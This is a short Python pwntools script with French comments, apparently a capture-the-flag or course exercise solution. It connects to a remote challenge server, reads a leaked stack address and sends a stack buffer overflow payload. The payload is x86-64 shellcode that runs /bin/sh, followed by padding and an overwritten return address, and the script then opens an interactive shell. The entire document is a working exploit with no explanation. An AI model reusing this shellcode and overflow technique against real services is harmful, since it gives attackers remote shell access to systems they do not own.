from pwn import *

# Connexion au serveur
p = remote('cytech.tcdn.casa', 4104)

# Attendre que le message arrive avec un timeout
try:
    p.recvuntil("est actuellement à 0x7ffd6f36f4f0 \n".encode('utf-8'), timeout=5)
except EOFError:
    print("Erreur : le serveur a fermé la connexion.")
    exit(1)
except Exception as e:
    print(f"Erreur : {e}")
    exit(1)

# Payload à envoyer
payload = b'H1\xf6VH\xbf/bin/sh\x00WH\x89\xe7H1\xd2H1\xc0\xb0;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\xdc\xff\xff\xff\x7f\x00\x00'

# Envoyer le payload
p.sendline(payload)

# Interaction avec la session
p.interactive()
